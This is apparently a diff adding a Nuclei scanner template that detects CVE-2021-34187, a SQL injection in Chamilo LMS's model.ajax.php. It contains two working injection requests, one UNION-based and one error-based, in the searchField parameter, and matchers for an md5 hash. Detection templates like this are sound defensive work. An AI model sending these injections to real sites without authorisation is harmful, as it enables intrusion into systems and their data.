@@ -1,0 +1,46 @@
+id: chamilo-sql-injection-cve-2021-34187
+info:
+  name: Chamilo model.ajax.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Chamilo LMS is an open-source online learning and collaboration system. There is a SQL injection vulnerability in Chamilo's main/inc/ajax/model.ajax.php, allowing SQL injection via the searchField, filters, or filters2 parameters.
+  reference:
+    - https://murat.one/?p=118
+    - https://github.com/chamilo/chamilo-lms.
+  classification:
+    cve-id: CVE-2021-34187
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: sql,injection,lms
+
+http:
+  - raw:
+      - |
+        GET /main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5(111))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; Nuclei)
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "698d51a19d8a121ce581499d7b701668"
+
+  - raw:
+      - |
+        GET /main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5(111)))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (compatible; Nuclei)
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "698d51a19d8a121ce581499d7b701668"
